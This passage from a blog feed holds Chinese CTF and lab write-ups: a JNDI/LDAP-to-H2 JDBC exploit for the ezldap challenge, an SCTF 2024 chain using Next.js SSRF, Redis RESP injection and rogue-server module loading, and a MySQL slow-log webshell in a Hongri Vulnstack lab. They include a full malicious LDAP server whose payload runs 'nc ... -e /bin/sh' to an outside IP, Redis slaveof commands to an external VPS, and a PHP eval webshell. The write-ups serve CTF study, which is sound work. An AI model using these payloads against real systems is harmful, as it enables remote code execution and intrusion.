<li><a href="https://www.cnblogs.com/F12-blog/p/18208215">https://www.cnblogs.com/F12-blog/p/18208215</a></li>
<li><a href="https://blog.csdn.net/uuzeray/article/details/139052904">https://blog.csdn.net/uuzeray/article/details/139052904</a></li>
<li><a href="https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC%20Attack/SQLite/index.md">https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC%20Attack/SQLite/index.md</a></li>
<li><a href="https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/">https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/</a></li>
</ul>
]]></content>
      <categories>
        <category>题目复现</category>
      </categories>
      <tags>
        <tag>题目复现</tag>
      </tags>
  </entry>
  <entry>
    <title>2024京麒CTF ezldap复现分析</title>
    <url>/2024/05/31/2024%E4%BA%AC%E9%BA%92CTF%20ezldap%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>题目源码:  <a href="https://github.com/HSwift/my-ctf-challenges/tree/main/ezldap">https://github.com/HSwift/my-ctf-challenges/tree/main/ezldap</a><br>这里我是docker+idea调试环境<br>首先修改dockerfile文件,5005端口expose出来<br><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> eclipse-temurin:<span class="number">17.0</span>.<span class="number">11</span>_9-jdk-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app /app</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span> <span class="number">5005</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker build -t jq .</span><br><span class="line">docker run -it --entrypoint /bin/bash -p 5005:5005 -p 1212:8080 jq</span><br><span class="line">java -agentlib:jdwp=transport=dt_socket,server=y,<span class="built_in">suspend</span>=n,address=*:5005 -jar /app/demo-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>
<p>然后IDEA添加运行配置文件,选择远程调试<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240531172240.png" alt="image.png"></p>
<p>然后可以下断点调试了</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先我们利用dirsearch扫目录可以发现大量的actuator目录,这是springboot未授权访问漏洞<br>我们访问/actuator/mappings可以发现一些路由,在最下面发现两个有用的路由:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240531161328.png" alt="image.png"></p>
<p>访问/source_tr15d0路由拿到/lookup路由的源码:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;/lookup&quot;) public String lookup(String path) &#123; try &#123; String url = &quot;ldap://&quot; + path; InitialContext initialContext = new InitialContext(); initialContext.lookup(url); return &quot;ok&quot;; &#125;catch (NamingException e)&#123; return &quot;failed&quot;; &#125; &#125;</span><br></pre></td></tr></table></figure></p>
<p>这里直接打JNDI不行,应该有版本限制,我们先利用未授权访问漏洞收集尽可能多的信息<br>在env处发现了有h2依赖<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240531161607.png" alt="image.png"></p>
<p>思路是利用jndi打ldap绕过高版本jdk限制来打JDBC来h2 RCE<br>但是env这里还发现了com.sun.jndi.ldap.object.trustSerialData为false,当时卡在了这里<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;com.sun.jndi.ldap.object.trustSerialData&quot;: &#123;</span><br><span class="line">         &quot;value&quot;: &quot;false&quot;</span><br><span class="line">       &#125;,</span><br></pre></td></tr></table></figure></p>
<p>这个我们需要知道ldap恶意服务器不仅可以直接返回恶意的序列化数据/序列化的Reference对象,还可以直接返回Reference,它有对应的编码方式<br>我们查看<code>com.sun.jndi.ldap.Obj.java</code>文件的decodeObject()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240530215053.png" alt="image.png"><br>这里几个内置变量的值分别为:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static final String[] JAVA_ATTRIBUTES = new String[]&#123;&quot;objectClass&quot;, &quot;javaSerializedData&quot;, &quot;javaClassName&quot;, &quot;javaFactory&quot;, &quot;javaCodeBase&quot;, &quot;javaReferenceAddress&quot;, &quot;javaClassNames&quot;, &quot;javaRemoteLocation&quot;&#125;;</span><br><span class="line"></span><br><span class="line">static final String[] JAVA_OBJECT_CLASSES = new String[]&#123;&quot;javaContainer&quot;, &quot;javaObject&quot;, &quot;javaNamingReference&quot;, &quot;javaSerializedObject&quot;, &quot;javaMarshalledObject&quot;&#125;;</span><br><span class="line"></span><br><span class="line">static final String[] JAVA_OBJECT_CLASSES_LOWER = new String[]&#123;&quot;javacontainer&quot;, &quot;javaobject&quot;, &quot;javanamingreference&quot;, &quot;javaserializedobject&quot;, &quot;javamarshalledobject&quot;&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>我们的ldap恶意服务器在返回数据时,可以根据通过修改一些配置来让它走到最后的decodeReference</p>
<p>我们要进入decodeReference方法,首先要<code>JAVA_ATTRIBUTES[OBJECT_CLASS]</code>不为空,也就是远程的objectClass值,为”javaNamingReference”<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240531162827.png" alt="image.png"></p>
<p>进入decodeReference之后会获取<code>javaClassName</code>和<code>javaFactory</code>的值,然后新建Reference对象<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240531163124.png" alt="image.png"></p>
<p>接着获取<code>javaReferenceAddress</code>的值,取它size大小,经过for循环和一系列函数取出里面的值存入refAddrList中,最后添加到ref变量里<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240531163935.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240531164111.png" alt="image.png"></p>
<p>此时成功返回了恶意的Reference对象<br>随后回到ldapCtx的decodeObject()方法,然后进入<code>DirectoryManager.getObjectInstance</code>方法里<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240531164458.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240531164555.png" alt="image.png"></p>
<p>后面就是本地类factory的绕过高版本jdk的方式了<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240531164659.png" alt="image.png"><br>先判断是它Reference类型的,类型转化赋值给ref,然后获取factory,这里是恶意的<code>org.apache.tomcat.jdbc.pool.DataSourceFactory</code>类<br>调用它的getObjectInstance()方法,最后走到<code>DataSourceFactory</code>类的createDataSource方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240531170037.png" alt="image.png"></p>
<p>跟进<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240531170833.png" alt="image.png"></p>
<p>进入createPool()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240531170904.png" alt="image.png"><br>进入new ConnectionPool()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240531170932.png" alt="image.png"><br>调用ConnectionPool.init()方法来完成数据库连接</p>
<p>exp:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.RefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jingqi</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1389</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>());</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Send LDAP reference&quot;</span>);</span><br><span class="line">                entry.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:memdb;TRACE_LEVEL_SYSTEM_OUT=3;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;INIT=CREATE ALIAS EXEC AS &#x27;String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd)\\;return \&quot;test\&quot;\\;&#125;&#x27;\\;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;CALL EXEC (&#x27;nc 111.229.158.40 2345 -e /bin/sh&#x27;)\\;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;javax.sql.DataSource&quot;</span>, <span class="string">&quot;org.apache.tomcat.jdbc.pool.DataSourceFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;driverClassName&quot;</span>, <span class="string">&quot;org.h2.Driver&quot;</span>));</span><br><span class="line">                ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;url&quot;</span>, url));</span><br><span class="line">                ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;initialSize&quot;</span>, <span class="string">&quot;1&quot;</span>));</span><br><span class="line">                ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;sa&quot;</span>));</span><br><span class="line">                encodeReference(<span class="string">&#x27;#&#x27;</span>, ref, entry);</span><br><span class="line"></span><br><span class="line">                result.sendSearchEntry(entry);</span><br><span class="line">                result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">encodeReference</span><span class="params">(<span class="type">char</span> separator, Reference ref, Entry attrs)</span> &#123;</span><br><span class="line"></span><br><span class="line">            String s;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((s = ref.getClassName()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                attrs.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, s);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((s = ref.getFactoryClassName()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                attrs.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, s);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((s = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                attrs.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, s);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> ref.size();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">refAttr</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                RefAddr refAddr;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">                    refAddr = ref.get(i);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (refAddr <span class="keyword">instanceof</span> StringRefAddr) &#123;</span><br><span class="line">                        refAttr = (<span class="string">&quot;&quot;</span> + separator + i +</span><br><span class="line">                                separator + refAddr.getType() +</span><br><span class="line">                                separator + refAddr.getContent());</span><br><span class="line">                    &#125;</span><br><span class="line">                    attrs.addAttribute(<span class="string">&quot;javaReferenceAddress&quot;</span>, refAttr);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>成功弹到shell<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240531171716.png" alt="image.png"></p>
<p>注意:</p>
<ol>
<li>h2 rce这个payload的函数名EXEC只能用一次,第二次打不通</li>
<li>这题是alpine环境,没有bash只有sh<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><a href="https://github.com/HSwift/my-ctf-challenges/tree/main/ezldap">https://github.com/HSwift/my-ctf-challenges/tree/main/ezldap</a></li>
</ol>
]]></content>
      <categories>
        <category>题目复现</category>
      </categories>
      <tags>
        <tag>题目复现</tag>
      </tags>
  </entry>
  <entry>
    <title>2024SCTF出题记录</title>
    <url>/2024/10/01/2024%20SCTF%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="ezjump"><a href="#ezjump" class="headerlink" title="ezjump"></a>ezjump</h2><p>题目附件已更新至: <a href="https://github.com/jmx0hxq/My-CTF-Challenges/blob/master/2024SCTF/sctf2024_ezjump.zip">https://github.com/jmx0hxq/My-CTF-Challenges/blob/master/2024SCTF/sctf2024_ezjump.zip</a></p>
<p>打开附件查看docker-compose文件发现有docker容器,一个fronted,一个backend,一个redis其中只有fronted容器暴露在公网,flag在redis机器的根目录</p>
<h3 id="fronted"><a href="#fronted" class="headerlink" title="fronted"></a>fronted</h3><p>我们的fronted写了两个路由,一个/play,一个/success,这里的/play路由就是3秒钟算一个数学题,一直得分到10000分以上才会跳转/success路由,但是我没想让师傅们玩这个无聊游戏就没引入认证模块,可以直接访问/success路由,观察package.json发现nextjs的版本是14.1.0,存在CVE-2024-34351漏洞,观察源码可以发现<code>Let us Play Again!!</code>就是调用了<code>redirect(&quot;/play&quot;)</code>,其中的redirect函数可以触发SSRF漏洞</p>
<p>写一个main.ts:<br><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Deno</span>.<span class="title function_">serve</span>(&#123; <span class="attr">hostname</span>: <span class="string">&quot;0.0.0.0&quot;</span>, <span class="attr">port</span>: <span class="number">8000</span> &#125;, <span class="function">(<span class="params">request: Request</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Request received: &quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: request.<span class="property">url</span>,</span><br><span class="line">        <span class="attr">method</span>: request.<span class="property">method</span>,</span><br><span class="line">        <span class="attr">headers</span>: <span class="title class_">Array</span>.<span class="title function_">from</span>(request.<span class="property">headers</span>.<span class="title function_">entries</span>()),</span><br><span class="line">    &#125;));</span><br><span class="line">    <span class="comment">// Head - &#x27;Content-Type&#x27;, &#x27;text/x-component&#x27;;</span></span><br><span class="line">    <span class="keyword">if</span> (request.<span class="property">method</span> === <span class="string">&#x27;HEAD&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="literal">null</span>, &#123;</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/x-component&#x27;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Get - redirect to example.com</span></span><br><span class="line">    <span class="keyword">if</span> (request.<span class="property">method</span> === <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="literal">null</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">302</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="title class_">Location</span>: <span class="string">&#x27;http://172.11.0.3:5000/&#x27;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>远程vps:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deno run --allow-net --allow-read main.ts</span><br></pre></td></tr></table></figure></p>
<p>burp抓跳转的包,然后修改Host和Origin地址为vps地址即可<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241001005724.png" alt="image.png"></p>
<h3 id="backend"><a href="#backend" class="headerlink" title="backend"></a>backend</h3><p>这里后端写了个/login路由,可以创建新用户,并将用户信息保存到redis服务器的键值对里,我们的目标是创建一个role是admin的新用户,然后调用curl命令,但是这里的逻辑只会把新用户的role设置成<code>noBody</code></p>
<p>我们观察Utils/redis.py文件可以发现SET设置键值对时调用waf()函数,将admin换成hacker,多出了一个字符,因此我们可以构造恶意resp请求来造成字符串逃逸,从而成功创建role为admin的新用户</p>
<p>payload如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/login?username=adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin%0D%0A$1%0D%0A1%0D%0A%0D%0A*3%0D%0A$3%0D%0ASET%0D%0A$15%0D%0Auser%3A5934020060%0D%0A$52%0D%0AeyJwYXNzd29yZCI6ICJleHBleHAiLCAicm9sZSI6ICJhZG1pbiJ9%0D%0A%0D%0A%0D%0A&amp;password=123</span><br></pre></td></tr></table></figure>
<p>此时观察redis键值对,发现成功写入<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241001005804.png" alt="image.png"></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241001005857.png" alt="image.png"></p>
<p>然后就可以调用curl命令了,这里我过滤了gopher://和file://协议,预期是用dict://解题</p>
<p>打主从复制RCE就是那一套操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 redis_rogue_server.py -v -path exp.so -lport 21000</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/login?username=5934020060&amp;password=expexp&amp;cmd=dict://127.0.0.1:6379/slaveof:47.108.254.70:21000</span><br></pre></td></tr></table></figure>
<p>但是这里有一个地方需要注意,当主服务器与从服务器建立连接之后,从服务器会清除本地的redis存储,包括键值对,我们虽然成功的把exp.so传到了从服务器,但是键值对的清空导致无法再利用curl接口</p>
<p>这里需要了解一下<code>slave-read-only</code>配置<br> Redis 主服务器（master server）具有读写的权限，而 从服务器（slave master）默认 只具有 读 的权限。<br> 当关闭这个配置时,我们在传输完exp.so之后,主服务器关闭服务,再访问一遍之前redis字符串逃逸的payload,就可以重新写入之前的键值对</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.11.0.3:5000/login?username=5934020060&amp;password=expexp&amp;cmd=dict://172.11.0.4:6379/info</span><br></pre></td></tr></table></figure>
<p>将info依次改为下面的payload<br>payload:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config:set:slave-read-only:no</span><br><span class="line">config:set:dir:/tmp(这里镜像的/data目录有写的权限,可以不改)</span><br><span class="line">config:set:dbfilename:exp.so</span><br><span class="line">slaveof:47.108.254.70:21000</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241001011205.png" alt="image.png"></p>
<p>此时重新打入键值对:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/login?username=adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin%0D%0A$1%0D%0A1%0D%0A%0D%0A*3%0D%0A$3%0D%0ASET%0D%0A$15%0D%0Auser%3A5934020060%0D%0A$52%0D%0AeyJwYXNzd29yZCI6ICJleHBleHAiLCAicm9sZSI6ICJhZG1pbiJ9%0D%0A%0D%0A%0D%0A&amp;password=123</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241001011234.png" alt="image.png"></p>
<p>然后访问curl接口:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module:load:./exp.so</span><br><span class="line">system.exec:&quot;cat$&#123;IFS&#125;/flag&quot;</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241001011343.png" alt="image.png"></p>
<p>最终获取flag</p>
<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>这里我的预期是通过dict://协议修改redis的<code>slave-read-only</code>配置项,从而使从服务器可以重新写入键值对<br>但是waf函数过滤的不严格,导致可以使用<code>Gopher://</code>绕过,也可以使用<code>gopher:/&#123;/172.11.0.4:6379_&#125;</code>绕过<br>大佬们还是太强了!!!</p>
]]></content>
      <categories>
        <category>题目复现</category>
      </categories>
      <tags>
        <tag>题目复现</tag>
      </tags>
  </entry>
  <entry>
    <title>红日靶场1学习记录</title>
    <url>/2024/12/07/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/</url>
    <content><![CDATA[<h3 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h3><p>下载地址  :<br>百度网盘： <a href="https://pan.baidu.com/s/1nC6V8e_EuKfaLb2IuEbe7w&amp;shfl=sharepset">https://pan.baidu.com/s/1nC6V8e_EuKfaLb2IuEbe7w&amp;shfl=sharepset</a><br>密码: <strong>【红日安全】您的下载密码为：n1u2。</strong></p>
<p>下载完三个压缩包全部解压即可,打开里面的vmx虚拟机配置文件会自动打开VMware,初始密码是hongrisec@2019<br>winserver和win2k3显示密码过期重新设置一下即可<br>网络括扑图如下:<br><img src="http://vulnstack.qiyuanxuetang.net/media/vuln/screenshot/2019/10/20/%E7%BB%98%E5%9B%BE2.png" alt=""></p>
<p>这个win7是边界服务器,需要配置两个网卡,一个外网一个内网<br>在网络适配器加一个网卡设置为自定义Vmnet1(仅主机模式),另一个网卡为NAT模式<br><img src="https://s2.loli.net/2023/10/08/1YyHSuVg53kAxeF.png" alt="image.png"></p>
<p>这里需要修改虚拟网络编辑器的Vmnet1网卡的网段为192.168.52.x/24<br><img src="https://s2.loli.net/2023/10/08/cuByKiXb5x8VZnk.png" alt="image.png"></p>
<p>winserver2008和win2k3的网络适配器也都选择这个自定义的Vmnet1</p>
<p>因为它里面已经给配置好域里面的三个机器的ip了,我们只需要设置好网段就行了</p>
<p>网络配置:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win7边界: 外网:192.168.213.138 内网:192.168.52.143</span><br><span class="line">Windows server2008: 192.168.52.138</span><br><span class="line">win2k3 metasploitable: 192.168.52.141</span><br><span class="line">kali: 192.168.213.135或者后面换了电脑可能是192.168.128.129或者172.31.9.255</span><br></pre></td></tr></table></figure></p>
<p>互相ping一下测试发现问题:<br>winserver2008和win2k3能互相ping通<br>win7能ping通winserver2008和win2k3和物理机<br>winserver2008和win2k3和物理机不能ping通win7</p>
<p>解决:<br>打开win7的高级安全Windows防火墙,启用这四个<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231124190004.png" alt="Pasted image 20231124190004.png"></p>
<p>此时可以发现winserver2008和win2k3和物理机都能ping通win7了<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231124190043.png" alt="Pasted image 20231124190043.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231124190056.png" alt="Pasted image 20231124190056.png"></p>
<h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p>win7的C盘找到phpstudy启动一下服务,此时win11主机可以访问win7服务<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231124190358.png" alt="Pasted image 20231124190358.png"></p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>dirsearch 扫目录:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231124190651.png" alt="Pasted image 20231124190651.png"></p>
<p>root/root弱口令进去后台,</p>
<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>尝试慢日志注入<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW VARIABLES like &#x27;%slow_query_log%&#x27;;</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231124190758.png" alt="Pasted image 20231124190758.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global slow_query_log=1;</span><br><span class="line">SET GLOBAL slow_query_log_file=&#x27;C:/phpStudy/WWW/zoe.php&#x27;;</span><br><span class="line">select &quot;&lt;?php eval($_POST[&#x27;zoe&#x27;])?&gt;&quot; or sleep(11);</span><br></pre></td></tr></table></figure>
<p>蚁剑连接<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231124191425.png" alt="Pasted image 20231124191425.png"></p>
